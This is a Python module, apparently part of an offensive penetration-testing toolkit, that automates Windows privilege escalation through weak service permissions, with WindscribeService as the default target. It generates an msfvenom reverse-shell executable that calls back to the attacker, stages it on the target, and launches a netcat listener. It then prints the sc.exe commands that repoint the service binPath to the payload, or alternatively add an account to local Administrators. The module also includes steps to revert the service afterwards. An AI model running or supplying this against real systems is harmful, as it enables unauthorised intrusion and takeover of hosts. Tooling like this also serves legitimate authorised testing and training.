import shutil
import subprocess
from pathlib import Path

from core.target import load_current_profile, get_active_cred
from core.attacker import resolve_lhost
from modules.upload.windows import stage_windows_files, DEFAULT_REMOTE_DIR


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

DEFAULT_SERVICE = "WindscribeService"
DEFAULT_PATH = r"C:\Program Files (x86)\Windscribe\WindscribeService.exe"


# ==========================================
# HELPERS
# ==========================================

def _header(service):

    print(f"\n{B}┌── MODULE: WEAK PERMISSIONS — WEAK SERVICE PERMISSIONS " + "─" * 4 + f"┐{W}")
    print(f"{B}│{W} SERVICE: {C}{service:<49}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra, not just any
    # default-to-no question — safety gates stay blue.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    ip = resolve_lhost(args=None, data=data)
    domain = data.get("domain")

    user = None

    try:
        user = get_active_cred(data).get("user")
    except Exception:
        pass

    return ip, domain, user


def _start_listener(port):

    try:

        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"bash -c 'nc -lvnp {port}; exec bash'"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(f"{G}[+] Started a Netcat listener on port {port} in a new terminal{W}")

    except Exception as e:

        print(f"{R}[-] Failed to start listener: {e}{W}")
        print(f"{Y}[!] Start one yourself: nc -lvnp {port}{W}")


def _generate_reverse_shell(lhost, lport, arch, outfile):

    if not shutil.which("msfvenom"):

        print(f"\n{Y}[!] msfvenom not found on this box — generate it manually:{W}")
        _cmd(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -a {arch} --platform windows -f exe -o {outfile}")

        return None

    print(f"\n{B}[*] Generating {outfile} with msfvenom...{W}")

    result = subprocess.run(
        [
            "msfvenom",
            "-p", "windows/shell_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-a", arch,
            "--platform", "windows",
            "-f", "exe",
            "-o", outfile,
        ],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0 or not Path(outfile).is_file():

        print(f"{R}[-] msfvenom failed:{W}")
        print(result.stderr.strip())

        return None

    print(f"{G}[+] Generated {outfile}{W}")

    return Path(outfile)


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    ip, domain, default_user = _resolve_context()

    service = None

    if hasattr(args, "extra") and args.extra:
        service = args.extra[0]

    if not service:
        service = input(
            f"\n{B}[?]{W} Target service name [{C}{DEFAULT_SERVICE}{W}]: "
        ).strip() or DEFAULT_SERVICE

    _header(service)

    _section("Choose payload")

    admin_add = _ask(
        "Add a user to local Administrators instead of a reverse shell? [y/N]: ",
        default_yes=False,
        optional=True,
    )

    if admin_add:

        #
        # Never let a bracketed placeholder become the literal value a
        # blank Enter silently accepts.
        #
        if default_user:
            new_admin = input(
                f"\n{B}[?]{W} Account to add to local Administrators [{C}{default_user}{W}]: "
            ).strip() or default_user
        else:
            new_admin = ""
            while not new_admin:
                new_admin = input(
                    f"\n{B}[?]{W} Account to add to local Administrators "
                    f"(no active credential on file — required): "
                ).strip()

        binpath_payload = f"cmd /c net localgroup administrators {new_admin} /add"

    else:

        lport = input(f"\n{B}[?]{W} Listener port [{C}4444{W}]: ").strip() or "4444"
        arch = input(f"\n{B}[?]{W} Payload architecture, x86 or x64 [{C}x86{W}]: ").strip() or "x86"

        payload_name = f"{service}_svc.exe"
        payload_path = _generate_reverse_shell(ip or "<ATTACKER-IP>", lport, arch, payload_name)

        if payload_path and _ask(f"Transfer {payload_name} to the target? [Y/n]: "):
            stage_windows_files([payload_path])

        if _ask(f"Start a Netcat listener on port {lport} now? [Y/n]: "):
            _start_listener(lport)

        #
        # binPath needs a full path to an actual executable — this is where
        # stage_windows_files' fixed default staging dir pays off, we know
        # exactly where the payload lands without having to ask.
        #
        binpath_payload = f"{DEFAULT_REMOTE_DIR}\\{payload_name}"

    n = 1

    _section("Execute on target")

    _step(
        n,
        "Query the service to capture its current binary path — you'll need this for cleanup",
        "Also confirms SERVICE_START_NAME — this technique is only worth it if that's LocalSystem.",
    )
    _cmd(f"sc.exe qc {service}")
    n += 1

    _step(
        n,
        "Confirm you actually hold SERVICE_CHANGE_CONFIG",
        'Look for "DC" in an (A;;...) grant to AU (Authenticated Users), WD (Everyone), BU, or IU.',
    )
    _cmd(f"sc.exe sdshow {service}")
    n += 1

    if admin_add:
        _step(n, "Confirm the account isn't already a local admin")
        _cmd("net localgroup Administrators")
        n += 1

    _step(
        n,
        "Reconfigure the service to run the payload on start",
        "Note the required space after binpath= — sc.exe throws a syntax error without it.",
    )
    _cmd(f'sc.exe config {service} binpath= "{binpath_payload}"')
    n += 1

    _step(n, "Stop the service, so the new binpath takes effect on next start")
    _cmd(f"sc.exe stop {service}")
    n += 1

    _step(
        n,
        "Start the service",
        "Expected to fail (error 1053) — the payload still runs before the SCM gives up waiting and kills it.",
    )
    _cmd(f"sc.exe start {service}")
    n += 1

    if admin_add:

        _step(n, "Confirm the account landed in Administrators")
        _cmd("net localgroup Administrators")
        n += 1

        _step(n, "Get a fresh session to actually use the new admin membership")
        n += 1

        runas_user = f"{domain}\\{new_admin}" if domain else new_admin
        _cmd(f"runas /user:{runas_user} powershell.exe")

        print()
        print(f"    {B}[*]{W} Your old session's token is stale — it won't reflect the new group until relogon.")

    else:

        print()
        print(f"    {B}[*]{W} Catch the shell on your listener — it runs in the service's context (check whoami).")

    _section("Cleanup — do this, the service is left broken until reverted")

    _step(n, f"Revert {service}'s binary path")

    if service == DEFAULT_SERVICE:
        _cmd(f'sc.exe config {service} binpath= "{DEFAULT_PATH}"')
    else:
        _cmd(f'sc.exe config {service} binpath= "<ORIGINAL BINARY_PATH_NAME FROM STEP 1>"')

    print()
    print(f"    {B}[*]{W} Use exactly what step 1's sc.exe qc showed for BINARY_PATH_NAME — don't guess.")
    n += 1

    _step(n, "Start the service again")
    _cmd(f"sc.exe start {service}")
    n += 1

    _step(n, "Verify it's running normally")
    _cmd(f"sc.exe query {service}")
